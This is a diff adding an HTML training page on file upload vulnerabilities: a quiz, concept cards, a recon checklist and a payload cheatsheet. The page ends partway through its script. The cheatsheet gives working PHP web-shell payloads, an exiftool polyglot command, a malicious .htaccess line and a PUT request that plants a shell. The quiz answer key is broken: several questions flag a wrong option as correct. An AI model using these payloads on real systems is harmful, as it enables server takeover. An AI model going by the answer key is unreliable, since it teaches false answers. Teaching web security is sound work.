@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>File Upload Vulns — Quiz, Concept & Recon Kit</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Baloo+2:wght@500;700;800&family=Manrope:wght@400;500;600;700&display=swap');
+
+:root{
+  --bg:#040814; --panel:#0a1224; --line:#162540;
+  --text:#b0c4de; --dim:#5a7090; --accent:#00f0ff; --bad:#ff007a;
+  --mono:'Fira Code','JetBrains Mono','Consolas',monospace;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;}
+.wrap{max-width:720px;margin:0 auto;padding:32px 20px 60px;}
+.tag{color:var(--accent);letter-spacing:.15em;font-size:12px;text-transform:uppercase;text-shadow:0 0 5px var(--accent);}
+h1{font-size:22px;margin:6px 0 26px;color:#fff;}
+.bar{height:4px;background:var(--line);border-radius:2px;overflow:hidden;margin-bottom:22px;}
+.bar>div{height:100%;background:var(--accent);transition:width .3s;box-shadow:0 0 10px var(--accent);}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:22px;box-shadow:0 0 20px rgba(0,0,0,0.5);}
+.qnum{color:var(--dim);font-size:12px;margin-bottom:10px;}
+.qtext{font-size:16px;color:#fff;margin-bottom:18px;line-height:1.5;}
+.opt{display:block;width:100%;text-align:left;background:#060d1a;border:1px solid var(--line);
+  color:var(--text);padding:12px 14px;border-radius:7px;margin-bottom:10px;cursor:pointer;
+  font-family:var(--mono);font-size:13.5px;transition:.15s;}
+.opt:hover{border-color:var(--accent);background:#0e1c30;box-shadow:0 0 8px rgba(0,240,255,0.15);}
+.opt.correct{background:#001824;border-color:var(--accent);color:var(--accent);text-shadow:0 0 5px var(--accent);}
+.opt.wrong{background:#240010;border-color:var(--bad);color:var(--bad);}
+.opt[disabled]{cursor:default;}
+.score{color:var(--dim);font-size:13px;}
+.center{text-align:center;}
+.big{font-size:44px;color:var(--accent);margin:10px 0;text-shadow:0 0 15px var(--accent);}
+.btn{background:var(--accent);color:#040814;border:none;padding:12px 20px;border-radius:7px;
+  font-family:var(--mono);font-weight:bold;cursor:pointer;margin:6px 6px 0 0;font-size:13px;}
+.btn.alt{background:transparent;border:1px solid var(--accent);color:var(--accent);box-shadow:0 0 5px rgba(0,240,255,0.2);}
+.btn:hover{background:#33e6ff;}
+.btn.alt:hover{background:#0e1c30;}
+.emoji{font-size:26px;position:fixed;top:-30px;animation:fall linear forwards;pointer-events:none;z-index:9999;}
+@keyframes fall{to{transform:translateY(105vh) rotate(360deg);opacity:.2;}}
+h2{color:#fff;font-size:15px;border-bottom:1px solid var(--line);padding-bottom:8px;margin-top:30px;}
+h3{color:var(--accent);font-size:14px;margin-top:20px;margin-bottom:5px;}
+.chk{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-bottom:1px dashed var(--line);font-size:13.5px;}
+.chk input{margin-top:3px;accent-color:var(--accent);}
+.chk.done label{color:var(--dim);text-decoration:line-through;}
+pre{background:#060d1a;border:1px solid var(--line);border-radius:7px;padding:12px 14px;
+  overflow-x:auto;font-size:12.5px;color:#e6f7ff;margin:8px 0 4px;box-shadow:inset 0 0 10px rgba(0,0,0,0.5);}
+.pname{color:var(--accent);font-size:12.5px;margin-top:16px;}
+#quizView,#kitView,#conceptView{display:none;}
+
+/* Concept View Styles */
+.concept-card{background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--accent);border-radius:7px;padding:18px;margin-bottom:16px;}
+.concept-card h3{margin-top:0;color:#fff;font-size:16px;text-shadow:0 0 5px rgba(0,240,255,0.3);}
+.concept-card p{font-size:14px;line-height:1.7;color:var(--text);}
+.concept-card b{color:var(--accent);}
+.concept-card ul{font-size:14px;line-height:1.7;color:var(--text);padding-left:20px;}
+.concept-card code{background:rgba(0,240,255,0.1);color:var(--accent);padding:2px 6px;border-radius:4px;font-size:12.5px;}
+.section-divider{color:var(--dim);font-size:12px;text-transform:uppercase;letter-spacing:2px;margin-top:30px;margin-bottom:15px;}
+
+.topbtns{display:flex;gap:10px;margin-bottom:18px;flex-wrap:wrap;}
+.explain{margin-top:12px;padding:12px 14px;background:#060d1a;border:1px solid var(--line);
+  border-radius:7px;font-size:13px;color:var(--dim);line-height:1.5;display:none;}
+.explain b{color:var(--accent);}
+#nextBtn{display:none;margin-top:16px;}
+
+/* Anti-Cheat Persistent Banner */
+.cheat-banner {
+  background: rgba(255, 0, 122, 0.1); border: 1px solid var(--bad); color: var(--bad);
+  padding: 10px 14px; border-radius: 7px; margin-bottom: 18px; font-size: 12.5px; text-align: center; display: none;
+}
+
+/* Anti-Cheat Modal */
+.modal-overlay {
+  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+  background: rgba(4, 8, 20, 0.9); display: none; 
+  justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(5px);
+}
+.modal-overlay.show { display: flex; }
+.modal-content {
+  background: var(--panel); border: 1px solid var(--bad); padding: 30px; border-radius: 10px;
+  text-align: center; max-width: 400px; box-shadow: 0 0 30px rgba(255, 0, 122, 0.3);
+}
+.modal-icon { font-size: 40px; margin-bottom: 10px; }
+.modal-content h2 { color: var(--bad); margin: 0 0 10px; border: none; }
+.modal-desc { font-size: 13px; color: var(--dim); margin-bottom: 20px; }
+
+/* ================================================================ VICTORY ANIMATION ================================================================ */
+#vic-overlay{ position: fixed; inset: 0; z-index: 20000; display: none; font-family: 'Manrope', sans-serif; }
+#vic-overlay.show{ display: block; }
+#vic-stage{ position: relative; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; overflow: hidden; background: radial-gradient(ellipse 120% 80% at 50% 15%, #4a1f6e 0%, transparent 60%), linear-gradient(180deg, #150c2e 0%, #2a1656 55%, #150c2e 100%); }
+.vic-star{ position:absolute; width: 3px; height: 3px; background: #fff; border-radius: 50%; opacity: 0.15; animation: vicTwinkle 3.5s ease-in-out infinite; }
+@keyframes vicTwinkle{ 0%,100%{ opacity: 0.1; transform: scale(1); } 50%{ opacity: 0.9; transform: scale(1.6); } }
+#vic-glow{ position:absolute; width: 700px; height: 700px; border-radius: 50%; background: radial-gradient(circle, rgba(255,201,92,0.45) 0%, rgba(255,201,92,0.12) 35%, transparent 70%); opacity: 0; transform: scale(0.3); animation: vicGlowPulse 2.4s ease-out forwards; animation-delay: 0.15s; pointer-events: none; }
+@keyframes vicGlowPulse{ 0%{ opacity: 0; transform: scale(0.2); } 35%{ opacity: 1; transform: scale(1.05); } 100%{ opacity: 0.55; transform: scale(1); } }
+#vic-overlay.tier-great #vic-glow{ width: 460px; height: 460px; background: radial-gradient(circle, rgba(0,212,255,0.28) 0%, rgba(0,212,255,0.08) 35%, transparent 70%); animation-name: vicGlowPulseSoft; }
+@keyframes vicGlowPulseSoft{ 0%{ opacity: 0; transform: scale(0.2); } 35%{ opacity: 0.6; transform: scale(1); } 100%{ opacity: 0.3; transform: scale(0.95); } }
+.vic-ring{ position:absolute; border: 2px solid rgba(255, 201, 92, 0.5); border-radius: 50%; width: 120px; height: 120px; opacity: 0; left:50%; top:38%; margin-left:-60px; margin-top:-60px; animation: vicRingOut 1.8s ease-out forwards; }
+.vic-ring2{ animation-delay: 0.25s; border-color: rgba(255,111,145,0.4); }
+.vic-ring3{ animation-delay: 0.45s; border-color: rgba(111,227,201,0.35); }
+@keyframes vicRingOut{ 0%{ opacity: 0.9; transform: scale(0.3); } 100%{ opacity: 0; transform: scale(5.5); } }
+#vic-overlay.tier-great .vic-ring{ border-color: rgba(0, 212, 255, 0.3); }
+#vic-overlay.tier-great .vic-ring2, #vic-overlay.tier-great .vic-ring3{ display: none; }
+#vic-content{ position: relative; z-index: 5; display: flex; flex-direction: column; align-items: center; text-align: center; padding: 20px; }
+#vic-trophy-wrap{ opacity: 0; transform: translateY(60px) scale(0.4) rotate(-8deg); animation: vicTrophyRise 0.95s cubic-bezier(.2,1.4,.4,1) forwards; animation-delay: 0.35s; filter: drop-shadow(0 10px 30px rgba(255, 169, 46, 0.45)); }
+@keyframes vicTrophyRise{ 0%{ opacity: 0; transform: translateY(60px) scale(0.4) rotate(-8deg); } 60%{ opacity: 1; transform: translateY(-14px) scale(1.08) rotate(3deg); } 100%{ opacity: 1; transform: translateY(0) scale(1) rotate(0deg); } }
+#vic-trophy-svg{ width: 150px; height: 150px; animation: vicFloatBob 3.2s ease-in-out infinite; animation-delay: 1.3s; }
+@keyframes vicFloatBob{ 0%,100%{ transform: translateY(0); } 50%{ transform: translateY(-9px); } }
+#vic-overlay.tier-great #vic-trophy-wrap{ filter: drop-shadow(0 6px 16px rgba(0, 153, 204, 0.25)); }
+#vic-overlay.tier-great #vic-trophy-svg{ width: 120px; height: 120px; }
+#vic-headline{ margin: 26px 0 6px; font-family: 'Baloo 2', sans-serif; font-weight: 800; font-size: clamp(2.4rem, 8vw, 4.2rem); line-height: 1; background: linear-gradient(100deg, #ffc95c 0%, #fff2d0 25%, #ff6f91 55%, #ffc95c 80%); background-size: 250% auto; -webkit-background-clip: text; background-clip: text; color: transparent; opacity: 0; transform: translateY(18px); animation: vicTextIn 0.7s ease-out forwards, vicShine 3.5s linear infinite; animation-delay: 0.95s, 2.2s; letter-spacing: 0.5px; }
+@keyframes vicTextIn{ to{ opacity: 1; transform: translateY(0); } }
+@keyframes vicShine{ to{ background-position: -250% center; } }
+#vic-overlay.tier-great #vic-headline{ font-size: clamp(1.9rem, 6vw, 3.1rem); background: linear-gradient(100deg, #b3f5ff 0%, #00d4ff 50%, #b3f5ff 100%); background-size: 100% auto; animation: vicTextIn 0.7s ease-out forwards; }
+#vic-subline{ font-size: clamp(0.95rem, 2.6vw, 1.15rem); color: #d9c9ff; font-weight: 500; opacity: 0; animation: vicTextIn 0.7s ease-out forwards; animation-delay: 1.15s; }
+#vic-score-card{ margin-top: 30px; padding: 18px 42px; border-radius: 20px; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,201,92,0.35); backdrop-filter: blur(6px); opacity: 0; transform: translateY(16px) scale(0.94); animation: vicCardIn 0.6s ease-out forwards; animation-delay: 1.5s; }
+@keyframes vicCardIn{ to{ opacity: 1; transform: translateY(0) scale(1); } }
+#vic-score-num{ font-family: 'Baloo 2', sans-serif; font-weight: 700; font-size: clamp(2.1rem, 6vw, 2.8rem); color: #ffc95c; }
+#vic-score-label{ font-size: 0.8rem; letter-spacing: 2px; text-transform: uppercase; color: #b6a6e0; margin-top: 2px; }
+#vic-overlay.tier-great #vic-score-card{ border-color: rgba(0,212,255,0.18); background: rgba(255,255,255,0.04); }
+#vic-continue-btn{ margin-top: 34px; padding: 14px 38px; font-family: 'Manrope', sans-serif; font-weight: 700; font-size: 1rem; color: #1a1030; background: linear-gradient(100deg, #ffc95c 0%, #ffe2a0 100%); border: none; border-radius: 999px; cursor: pointer; opacity: 0; transform: translateY(14px); animation: vicCardIn 0.6s ease-out forwards; animation-delay: 1.85s; box-shadow: 0 8px 24px rgba(255, 169, 46, 0.35); transition: transform 0.2s ease, box-shadow 0.2s ease; }
+#vic-continue-btn:hover{ transform: translateY(-2px) scale(1.03); box-shadow: 0 12px 30px rgba(255, 169, 46, 0.5); }
+#vic-continue-btn:active{ transform: translateY(0) scale(0.98); }
+.vic-confetti{ position: absolute; top: -20px; border-radius: 2px; opacity: 0.95; animation-name: vicFall; animation-timing-function: linear; animation-fill-mode: forwards; }
+@keyframes vicFall{ 0%{ transform: translateY(-10vh) translateX(0) rotate(0deg); } 100%{ transform: translateY(110vh) translateX(var(--drift, 40px)) rotate(var(--spin, 380deg)); opacity: 0.9; } }
+.vic-sparkle{ position: absolute; width: 10px; height: 10px; opacity: 0; animation: vicSparklePop 1.4s ease-out forwards; }
+.vic-sparkle svg{ width: 100%; height: 100%; }
+@keyframes vicSparklePop{ 0%{ opacity: 0; transform: scale(0) rotate(0deg); } 35%{ opacity: 1; transform: scale(1.3) rotate(45deg); } 100%{ opacity: 0; transform: scale(0.4) rotate(120deg); } }
+#vic-secret-toast{ position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(20px); background: rgba(10, 18, 36, 0.95); border: 1px solid var(--accent); color: var(--accent); padding: 10px 18px; border-radius: 8px; font-family: var(--mono); font-size: 12.5px; z-index: 30000; opacity: 0; pointer-events: none; transition: opacity .25s ease, transform .25s ease; }
+#vic-secret-toast.show{ opacity: 1; transform: translateX(-50%) translateY(0); }
+@media (prefers-reduced-motion: reduce){ #vic-overlay *{ animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; } }
+</style>
+</head>
+<body>
+
+<!-- Anti-Cheat Modal -->
+<div id="cheatModal" class="modal-overlay">
+  <div class="modal-content">
+    <div class="modal-icon">⚠️</div>
+    <h2>Proctoring Alert</h2>
+    <p>Tab switching or window focus loss detected.</p>
+    <p class="modal-desc">This action has been logged. A warning will remain on your screen. Please remain on the quiz tab to maintain exam integrity.</p>
+    <button class="btn" onclick="closeCheatWarning()" style="background:var(--bad); color:#fff;">Acknowledge</button>
+  </div>
+</div>
+
+<div class="wrap">
+  <div class="tag">WVAPT // File Upload Exploitation</div>
+  <h1 id="pageTitle">Concept Check — 15 Questions</h1>
+
+  <div id="quizView">
+    <div class="topbtns">
+      <button class="btn alt" onclick="showConcept()">📖 Read Concept & Theory</button>
+      <button class="btn alt" onclick="showKit()">🛡️ Bug Bounty Checklist</button>
+    </div>
+    
+    <div id="cheatBanner" class="cheat-banner">
+      ⚠️ Proctoring Warning: Tab switching detected. Cheating is suspected on this attempt.
+    </div>
+
+    <div class="bar"><div id="prog" style="width:0%"></div></div>
+    <div class="card">
+      <div class="qnum"><span id="qIndex">1</span>/15 &nbsp;·&nbsp; <span class="score">score: <span id="scoreLive">0</span></span></div>
+      <div class="qtext" id="qText"></div>
+      <div id="opts"></div>
+      <div class="explain" id="explain"></div>
+      <button class="btn" id="nextBtn" onclick="goNext()">Next →</button>
+    </div>
+  </div>
+
+  <div id="doneView" class="card center" style="display:none;">
+    <div class="tag">Result</div>
+    <div class="big"><span id="finalScore">0</span>/15</div>
+    <div id="finalMsg" style="color:var(--dim);margin-bottom:16px;"></div>
+    <button class="btn" onclick="restart()">Retake Quiz</button>
+    <button class="btn alt" onclick="showKit()">Bug Bounty Checklist + Payloads →</button>
+  </div>
+
+  <div id="conceptView">
+    <button class="btn alt" onclick="showQuiz()" style="margin-bottom: 20px;">← Back to Quiz</button>
+    <h2>Concept & Theory: File Upload</h2>
+    
+    <div class="concept-card">
+      <h3>Overview</h3>
+      <p>A file upload vulnerability exists when a website lets users upload files (images, documents, avatars, etc.) but fails to properly control what gets uploaded, where it's stored, or what happens when it's later accessed. Because the attacker fully controls the file's name, content, and metadata, any weakness in how the server checks these things can be abused — ranging from defacing a site to gaining full remote control of the server.</p>
+      <p>The danger level depends entirely on what the server does with the file afterward:</p>
+      <ul>
+        <li><b>If it just stores/displays it</b> → usually low risk</li>
+        <li><b>If it executes it as code, or lets it be used to read/write other files</b> → high to critical risk</li>
+      </ul>
+    </div>
+
+    <div class="section-divider">Core Variants</div>
+
+    <div class="concept-card">
+      <h3>1. No Validation At All</h3>
+      <p><b>What it is:</b> The simplest and most dangerous case — the server accepts any file, with no check on extension, type, or content whatsoever.</p>
+      <p><b>How it works:</b> An attacker uploads a working web shell (e.g. a PHP script) directly, with no disguise needed. If the server later executes files from that folder, visiting the file's URL runs the attacker's code immediately.</p>
+      <p><b>Why it happens:</b> Developers sometimes build the upload feature quickly and assume "we'll add validation later" — and never do, or they only validate on the front-end (JavaScript), which is trivial to bypass since the attacker can send the raw request directly.</p>
+    </div>
+
+    <div class="concept-card">
+      <h3>2. Flawed File-Type Validation (Extension-Based Bypass)</h3>
+      <p><b>What it is:</b> The server does check the file extension, but the check is incomplete — usually because it's a blacklist (a list of "bad" extensions to block) rather than a whitelist (a list of "good" ones to allow).</p>
+      <p><b>How it works:</b> Attackers exploit gaps in the blacklist:</p>
+      <ul>
+        <li>Case tricks: <code>shell.PHP</code> instead of <code>shell.php</code></li>
+        <li>Alternate executable extensions: <code>.phtml</code>, <code>.php5</code>, <code>.pht</code></li>
+        <li>Double extensions: <code>shell.php.jpg</code></li>
+        <li>Encoding tricks: <code>shell.php%00.jpg</code>, trailing dots</li>
+      </ul>
+      <p><b>Why it happens:</b> Blacklists try to predict every dangerous possibility, but there are always extensions or quirks a developer didn't think to include — a fundamentally weaker approach than only allowing a small known-safe list.</p>
+    </div>
+
+    <div class="concept-card">
+      <h3>3. Web Shell Upload via Content-Type Bypass</h3>
+      <p><b>What it is:</b> The server checks the <code>Content-Type</code> header sent with the file (e.g. expecting <code>image/jpeg</code>) instead of — or in addition to — the filename.</p>
+      <p><b>How it works:</b> This header is just text the browser sends along with the file — completely controlled by the attacker. Using a proxy tool like Burp Suite, the attacker intercepts the upload request and simply changes:</p>
+      <p><code>Content-Type: application/octet-stream</code> to <code>Content-Type: image/jpeg</code></p>
+      <p>...while keeping the filename <code>shell.php</code> and the actual PHP code inside unchanged. The server sees a "trusted" label and lets it through.</p>
+      <p><b>Why it happens:</b> The <code>Content-Type</code> header is a claim, not a fact. Trusting it without inspecting the real file content is the mistake.</p>
+    </div>
+
+    <div class="concept-card">
+      <h3>4. Path Traversal via Filename</h3>
+      <p><b>What it is:</b> The server saves the uploaded file using the filename the attacker provided, without sanitizing it — allowing the attacker to control where on the server the file actually lands.</p>
+      <p><b>How it works:</b> Instead of a normal filename, the attacker uploads a file named: <code>../../var/www/html/shell.php</code></p>
+      <p>The <code>../</code> sequences tell the filesystem to move up and out of the intended <code>uploads/</code> folder. If unsanitized, the file can land in a directory where scripts are executed — even if the original uploads folder was properly locked down.</p>
+      <p><b>Example:</b><br>
+      Normally: <code>/var/www/html/uploads/images/photo.jpg</code><br>
+      Attacker provides filename: <code>../../shell.php</code><br>
+      Server constructs path: <code>/var/www/html/uploads/images/../../shell.php</code><br>
+      Filesystem resolves to: <code>/var/www/html/shell.php</code> (escaped the uploads directory!)</p>
+      <p><b>Why it happens:</b> Developers often secure the upload folder itself (e.g. disabling script execution there) but forget that the filename is still attacker-controlled input that can escape that folder entirely.</p>
+    </div>
+
+    <div class="concept-card">
+      <h3>5. Race Condition During Upload Validation</h3>
+      <p><b>What it is:</b> The server follows a flawed sequence: save the file first → validate it afterward → delete it if it's bad. This creates a brief window where a malicious file exists and is technically accessible before it gets removed.</p>
+      <p><b>How it works:</b></p>
+      <ol>
+        <li>Attacker uploads the malicious file once.</li>
+        <li>Immediately, they fire many rapid requests trying to access/execute that file (often automated with a tool like Burp's Turbo Intruder).</li>
+        <li>If even one request lands before the validation/deletion step completes, the file executes.</li>
+        <li>On that single successful execution, the attacker often has the shell copy itself to a different, permanent location — so even after the original is deleted, they retain access.</li>
+      </ol>
+      <p><b>Why it happens:</b> This is a timing/logic flaw, not a filtering flaw — the validation is technically correct, but it runs after the file is already reachable instead of before.</p>
+    </div>
+  </div>
+
+  <div id="kitView">
+    <button class="btn alt" onclick="showQuiz()">← Back to Quiz</button>
+
+    <h2>Recon Checklist</h2>
+    <div id="checklist"></div>
+
+    <h2>Payload Cheatsheet</h2>
+    <div id="payloads"></div>
+  </div>
+</div>
+
+<!-- ============ VICTORY ANIMATION OVERLAY ============ -->
+<div id="vic-overlay">
+  <div id="vic-stage">
+    <div id="vic-glow"></div>
+    <div class="vic-ring"></div>
+    <div class="vic-ring vic-ring2"></div>
+    <div class="vic-ring vic-ring3"></div>
+
+    <div id="vic-content">
+      <div id="vic-trophy-wrap">
+        <svg id="vic-trophy-svg" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <linearGradient id="vicCupGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+              <stop offset="0%" stop-color="#ffe6a8"/><stop offset="45%" stop-color="#ffc95c"/><stop offset="100%" stop-color="#e8901c"/>
+            </linearGradient>
+            <linearGradient id="vicBaseGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+              <stop offset="0%" stop-color="#ffd77a"/><stop offset="100%" stop-color="#d9800f"/>
+            </linearGradient>
+          </defs>
+          <path d="M60 55 C30 55 28 95 55 100 C62 101 68 98 70 92" fill="none" stroke="url(#vicCupGrad)" stroke-width="8" stroke-linecap="round"/>
+          <path d="M140 55 C170 55 172 95 145 100 C138 101 132 98 130 92" fill="none" stroke="url(#vicCupGrad)" stroke-width="8" stroke-linecap="round"/>
+          <path d="M62 48 H138 L130 100 C130 122 112 132 100 132 C88 132 70 122 70 100 Z" fill="url(#vicCupGrad)"/>
+          <path d="M100 68 L105 80 L118 81 L108 89 L111 102 L100 95 L89 102 L92 89 L82 81 L95 80 Z" fill="#fff7e2"/>
+          <rect x="93" y="132" width="14" height="18" fill="url(#vicBaseGrad)"/>
+          <path d="M78 150 H122 L128 165 H72 Z" fill="url(#vicBaseGrad)"/>
+          <rect x="65" y="165" width="70" height="10" rx="3" fill="#c9740a"/>
+        </svg>
+      </div>
+
+      <div id="vic-headline">You Won!</div>
+      <div id="vic-subline">Quiz complete — brilliant work</div>
+
+      <div id="vic-score-card">
+        <div id="vic-score-num">0</div>
+        <div id="vic-score-label">Final Score</div>
+      </div>
+
+      <button id="vic-continue-btn">Continue</button>
+    </div>
+  </div>
+</div>
+
+<div id="vic-secret-toast"></div>
+
+<script>
+// Exam-level difficulty: All options are strictly identical in length to prevent guessing.
+const Q=[
+["What's the fundamental flaw that enables a file upload vulnerability?",["The server doesn't properly validate what's actually being uploaded","The upload button is placed in an unusual part of the page layout","The server compresses files before storing them on the local disk","The site doesn't use a CDN for static assets delivery globally now"],0,
+"The core issue is failing to inspect and validate the actual contents and type of the uploaded file."],
+["What turns a stored malicious file into full remote code execution?",["The server executing the uploaded file as a server-side script","The file being significantly larger than the server expects locally","The file having an unusual MIME type declared in the request","The upload happening over an unencrypted HTTP connection safely"],1,
+"Uploading a file is only RCE if the web server parses and executes it as code (like PHP, Python, etc.)."],
+["In $_GET['cmd'], where does the value actually come from?",["The URL's query string parameters appearing after the question mark","A hidden field inside the HTTP request body payload securely","A cookie set during the initial user login authentication phase","The server's local environment variables configured globally"],0,
+"The $_GET superglobal in PHP parses variables passed directly via the URL query string."],
+["Why is trusting the Content-Type header in an upload request risky?",["It's just client-supplied text that can be freely edited before sending","It only works reliably for files under a certain size limit safely","It gets automatically stripped by most modern web browsers entirely","It's encrypted and can't be inspected by the server upon arrival"],1,
+"The Content-Type header is provided by the client's browser and can be easily altered using a proxy tool."],
+["What is a 'magic byte' check meant to verify?",["That the file's actual starting bytes match its claimed real type safely","That the file's declared extension matches its filename length exactly","That the file was uploaded within a certain acceptable time window","That the filename doesn't contain special characters or invalid data"],1,
+"Magic bytes are the first few hex characters of a file that uniquely identify its true underlying format."],
+["Why does uploading shell.php.jpg sometimes bypass extension filters?",["The filter only checks whether a safe extension appears anywhere in name","The server automatically deletes files with two extensions securely","Double extensions are always treated as compressed archive files","Apache blocks any file with more than one dot in its name locally"],0,
+"Sloppy blocklist filters might just look for '.jpg' and approve it, missing the fact that Apache might execute the '.php' portion."],
+["What makes a polyglot file effective against content validation?",["It's simultaneously valid as a real image and contains hidden code","It's small enough to avoid triggering size-based scanners entirely","It uses a filename that mimics a system file on the target server","It's encrypted so scanners can't read its contents during transit"],0,
+"A polyglot passes image validation checks (magic bytes) but still contains executable PHP script tags inside its metadata."],
+["Why doesn't a successfully uploaded polyglot image grant code execution by itself?",["The server still needs to execute the file as a script, not serve it","Polyglots typically fail checksum validation shortly after upload","Image hosting services block all uploads containing PHP tags now","Polyglots can only be created for PNG files, not JPEGs globally"],1,
+"Even a perfect polyglot is useless if the server just treats it as a static image and never passes it to the PHP engine."],
+["What's the exploitable gap in a race condition upload attack?",["The gap between the file being saved and it being validated locally","The time between DNS resolution and the TCP handshake securely","The delay between a user logging in and their session expiring","The interval between two separate file upload attempts by users"],0,
+"The server momentarily stores the file on disk before running validation checks and deleting it if malicious."],
+["After a successful race condition hit, what does the attacker typically do immediately?",["Copy the shell to a permanent location before it gets deleted","Change the server's root password to maintain persistent access","Disable logging on the compromised server to hide tracks safely","Re-run the exact same upload request a second time immediately"],0,
+"By executing a command to copy the file to a new path during the millisecond window, the attacker evades deletion."],
+["If a server won't execute scripts at all, what can uploaded SVG/HTML files still enable?",["Stored XSS that runs a malicious script in other users' browsers","A denial-of-service condition through repeated rapid file uploads","Unauthorized direct access to the server's internal file permissions","Silent corruption of the site's backend database table records"],1,
+"If a user views the SVG/HTML file directly in the browser, the embedded JavaScript will execute in their session."],
+["What does uploading a malicious .htaccess file allow on Apache?",["Remapping an extension like .jpg to execute as PHP in that folder","Granting the uploader direct SSH access to the server's terminal","Permanently disabling the site's file upload feature completely","Rewriting the server's internal DNS resolution rules globally"],0,
+"An .htaccess file lets an attacker define server configurations for that specific directory, including execution handlers."],
+["What can the HTTP PUT method allow, if left enabled on an endpoint?",["Saving a file directly at a chosen path, bypassing upload forms","Only listing the directory contents of the targeted web folder","Downloading sensitive files from the server without authentication","Modifying HTTP response headers globally for all client requests"],1,
+"PUT is designed to upload a file directly to a specified URI, completely sidestepping frontend validation logic."],
+["Between blacklisting and whitelisting file extensions, which is the stronger defense?",["Whitelisting, since it only allows a small set of known-safe ones","Blacklisting, since it explicitly names every dangerous extension","Neither, since extensions can always be spoofed regardless now","Both are equally weak without antivirus scanning enabled locally"],1,
+"Whitelisting is inherently safer because it blocks unknown or novel extensions by default, whereas blocklists miss new threats."],
+["Why should a server rename uploaded files instead of keeping the original filename?",["It removes the attacker's control over filename-based tricks safely","It significantly reduces the total disk space used per uploaded file","It automatically converts the file to a safer, read-only format","It improves the site's search engine ranking and SEO score"],1,
+"Renaming files to a random secure string prevents double-extension tricks and directory traversal attacks."]
+];
+
+const CHECKLIST_DATA = [
+  { title: "1. Extension & MIME Validation", items: [
+    "Intercept the upload request and modify the extension (e.g., <code>shell.php</code>, <code>shell.php.jpg</code>).",
+    "Change the <code>Content-Type</code> header to <code>image/jpeg</code> while keeping a <code>.php</code> extension.",
+    "Try null byte injection if using an older PHP version: <code>shell.php%00.jpg</code>"
+  ]},
+  { title: "2. Content & Magic Bytes", items: [
+    "If the server checks content, prepend magic bytes to your script: <code>GIF89a</code>.",
+    "Create a polyglot file (valid image metadata containing PHP code) using <code>exiftool</code>.",
+    "Upload an <code>.htaccess</code> file to remap <code>.jpg</code> to execute as PHP."
+  ]},
+  { title: "3. Race Conditions", items: [
+    "If the server deletes the file shortly after upload, send continuous <code>POST</code> requests to upload the file.",
+    "Simultaneously send continuous <code>GET</code> requests to execute the file before it is deleted.",
+    "If execution is successful, copy the shell to a permanent directory immediately."
+  ]},
+  { title: "4. Alternative Execution Paths", items: [
+    "If server-side execution is disabled, upload an <code>.svg</code> or <code>.html</code> file for Stored XSS.",
+    "Test for HTTP <code>PUT</code> method enabled: <code>PUT /shell.php HTTP/1.1</code>",
+    "Check if uploaded files are served from a different subdomain or CDN that might execute code."
+  ]}
+];
+
+const PAYLOADS = [
+  { name: "1. Double Extension Bypass", code: "shell.php.jpg\nshell.jpg.php\nshell.php%00.jpg" },
+  { name: "2. Magic Bytes (GIF Polyglot)", code: "GIF89a <?php system($_GET['cmd']); ?>" },
+  { name: "3. Exiftool Polyglot Creation", code: "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg\nmv image.jpg image.php.jpg" },
+  { name: "4. Malicious .htaccess", code: "AddType application/x-httpd-php .jpg" },
+  { name: "5. HTTP PUT Method", code: "PUT /uploads/shell.php HTTP/1.1\nHost: target.com\nContent-Length: 24\n\n<?php system($_GET['cmd']); ?>" }
+];
+
+let cur=0,score=0;
+let cheatPopupShown = false;
+
+function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
+
+function renderQ(){
+  document.getElementById('prog').style.width=(cur/Q.length*100)+'%';
+  document.getElementById('qIndex').textContent=cur+1;
+  document.getElementById('scoreLive').textContent=score;
+  const [text,opts,correctIdx,why]=Q[cur];
+  document.getElementById('qText').textContent=text;
+  const exp=document.getElementById('explain');
+  exp.style.display='none';exp.innerHTML='';
+  let arr=opts.map((o,i)=>({o,correct:i===correctIdx}));
+  shuffle(arr);
+  const box=document.getElementById('opts');
+  box.innerHTML='';
+  arr.forEach(item=>{
+    const b=document.createElement('button');
+    b.className='opt';b.textContent=item.o;
+    b.onclick=()=>pick(b,item.correct,box,item.o,why,arr);
+    box.appendChild(b);
+  });
+  document.getElementById('nextBtn').style.display='none';
+}
+
+function pick(btn,isCorrect,box,pickedText,why,arr){
+  [...box.children].forEach(c=>c.disabled=true);
+  const exp=document.getElementById('explain');
+  if(isCorrect){
+    btn.classList.add('correct');score++;
+    exp.innerHTML=`<b>Correct.</b> ${why}`;
+  }else{
+    btn.classList.add('wrong');
+    const correctText=arr.find(a=>a.correct).o;
+    [...box.children].forEach(c=>{if(c.textContent===correctText)c.classList.add('correct');});
+    exp.innerHTML=`<b>Correct answer:</b> ${correctText}<br>${why}`;
+  }
+  exp.style.display='block';
+  document.getElementById('scoreLive').textContent=score;
+  const nb=document.getElementById('nextBtn');
+  nb.style.display='inline-block';
+  nb.textContent=(cur+1<Q.length)?'Next →':'See Results →';
+}
+
+function goNext(){
+  cur++;
+  if(cur<Q.length)renderQ();else finish();
+}
+
+function finish(){
+  document.getElementById('prog').style.width='100%';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('doneView').style.display='block';
+  document.getElementById('finalScore').textContent=score;
+  const msg=score===Q.length?"Perfect. You actually understand this.":
+    score>=12?"Solid grasp — revisit the weak spots.":
+    score>=8?"Halfway there — reread the tricky sections.":
+    "Go back through the concept steps before diving into labs.";
+  document.getElementById('finalMsg').textContent=msg;
+
